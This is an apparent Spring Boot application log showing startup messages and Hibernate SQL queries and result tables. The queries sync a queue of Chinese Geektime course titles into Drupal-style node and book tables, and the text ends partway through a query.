2020-11-19 10:55:25.276 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 10:55:25.351 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 10:55:25.351 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 903 ms
2020-11-19 10:55:25.485 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 10:55:25.492 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 10:55:25.599 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
2020-11-19 10:55:25.696 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 10:55:25.741 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 10:55:25.847 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 10:55:25.939 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 10:55:25.941 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:55:25.945 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:55:26.535 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 10:55:26.542 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:55:27.380 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:55:27.449 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 10:55:27.465 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 10:55:28.563 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:55:28.567 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 10:55:28.999 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 10:55:29.004 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.387 seconds (JVM running for 8.222)
2020-11-19 10:55:29.233 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 10:55:29.233 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 10:55:29.238 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 5 ms
2020-11-19 10:55:51.969 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_, queueentit0_.base_path as base_pat2_18_, queueentit0_.name 
as name3_18_, queueentit0_.todo as todo4_18_ from queue_new queueentit0_ where queueentit0_.todo=1 
 {executed in 1 msec}
2020-11-19 10:55:51.982 INFO  jdbc.resultsettable Line:610 - 
|-----------------|-------------------------------|--------------------|-----|
|item_id          |base_path                      |name                |todo |
|-----------------|-------------------------------|--------------------|-----|
|283828550600385  |00-资源文件/14-极客时间/01-专栏课/051-99/ |87-全栈工程师修炼指南        |1    |
|300655922831157  |00-资源文件/14-极客时间/01-专栏课/051-99/ |52-透视HTTP协议         |1    |
|390535478164697  |00-资源文件/14-极客时间/01-专栏课/051-99/ |51-白话法律42讲          |1    |
|409602706903658  |00-资源文件/14-极客时间/01-专栏课/051-99/ |77-从0打造音视频直播系统      |1    |
|459081746926346  |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|476330106989327  |00-资源文件/14-极客时间/01-专栏课/051-99/ |88-高并发系统设计40问       |1    |
|621195835058382  |00-资源文件/14-极客时间/01-专栏课/051-99/ |97-项目管理实战20讲        |1    |
|626896109933850  |00-资源文件/14-极客时间/01-专栏课/051-99/ |98-设计模式之美           |1    |
|773737007105338  |00-资源文件/14-极客时间/01-专栏课/051-99/ |53-OpenResty从入门到实战  |1    |
|781941951179116  |00-资源文件/14-极客时间/01-专栏课/051-99/ |75-编辑训练营            |1    |
|787964344536295  |00-资源文件/14-极客时间/01-专栏课/051-99/ |80-网络编程实战           |1    |
|789557280998655  |00-资源文件/14-极客时间/01-专栏课/051-99/ |86-即时消息技术剖析与实战      |1    |
|823812106395779  |00-资源文件/14-极客时间/01-专栏课/051-99/ |74-Flutter核心技术与实战   |1    |
|855137735533744  |00-资源文件/14-极客时间/01-专栏课/051-99/ |94-DDD实战课           |1    |
|861073733380654  |00-资源文件/14-极客时间/01-专栏课/051-99/ |90-分布式技术原理与算法解析     |1    |
|876595205877896  |00-资源文件/14-极客时间/01-专栏课/051-99/ |91-说透中台             |1    |
|877479874575179  |00-资源文件/14-极客时间/01-专栏课/051-99/ |83-编译原理之美           |1    |
|936433950782588  |00-资源文件/14-极客时间/01-专栏课/051-99/ |95-苏杰的产品创新课         |1    |
|952316731239648  |00-资源文件/14-极客时间/01-专栏课/051-99/ |92-DevOps实战笔记       |1    |
|954967934009220  |00-资源文件/14-极客时间/01-专栏课/051-99/ |73-黄勇的OKR实战笔记       |1    |
|1004252009859251 |00-资源文件/14-极客时间/01-专栏课/051-99/ |85-研发效率破局之道         |1    |
|1009872364102685 |00-资源文件/14-极客时间/01-专栏课/051-99/ |81-浏览器工作原理与实践       |1    |
|1022101157981678 |00-资源文件/14-极客时间/01-专栏课/051-99/ |79-消息队列高手课          |1    |
|-----------------|-------------------------------|--------------------|-----|

2020-11-19 10:55:51.994 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='283828550600385' 
 {executed in 1 msec}
2020-11-19 10:55:51.995 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|1         |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:55:51.999 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:55:52.000 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|1   |zh-hans  |book |4bb8e624-5f97-4aae-b6e2-3b2e1b596579 |1   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:55:52.031 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:55:52.032 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:55:52.037 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:55:52.038 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|1   |1   |1     |1            |1  |0  |0  |0  |0  |0   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:55:52.045 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:55:52.046 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|1         |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:55:52.050 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:55:52.051 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:55:52.058 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:55:52.059 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|1   |1605754496 |1605754496 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |book |1   |1   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:55:52.064 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:55:52.065 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754496 |1605754496 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |1   |1   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:55:52.072 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754552, created=1605754552, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', type='book', 
uid=1, vid=1 where nid=1 
 {executed in 0 msec}
2020-11-19 10:55:52.073 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754552, created=1605754552, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', 
uid=1, vid=1 where nid=1 
 {executed in 0 msec}
2020-11-19 10:55:52.086 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:55:52.086 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|1         |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:55:52.092 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:55:52.093 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:55:52.097 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:55:52.098 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|1         |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:55:52.105 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:55:52.105 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:55:52.109 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:55:52.109 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|1         |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:55:52.116 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:55:52.117 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:55:52.122 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:55:52.122 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:55:52.127 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:55:52.128 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:55:53.607 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='568347143558516' 
 {executed in 0 msec}
2020-11-19 10:55:53.609 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|2         |book   |0     |568347143558516  |zh-hans  |2           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:55:53.611 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:55:53.612 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|2   |zh-hans  |book |d915ec1c-b08c-4c6a-ae15-dd21d3de8ea1 |2   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:55:53.619 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:55:53.621 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |568347143558516  |zh-hans  |2           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:55:53.624 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:55:53.625 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|2   |1   |2     |1            |1  |2  |0  |0  |0  |1   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:55:53.628 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.629 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|2         |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:55:53.632 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:55:53.633 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:55:53.636 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:55:53.637 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|2   |1605754496 |1605754496 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |book |1   |2   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:55:53.638 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:55:53.639 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754496 |1605754496 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |1   |2   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:55:53.641 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754553, created=1605754553, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 (1讲)', type='book', 
uid=1, vid=2 where nid=2 
 {executed in 1 msec}
2020-11-19 10:55:53.642 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754553, created=1605754553, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 
(1讲)', uid=1, vid=2 where nid=2 
 {executed in 1 msec}
2020-11-19 10:55:53.646 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.647 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|2         |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:55:53.649 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
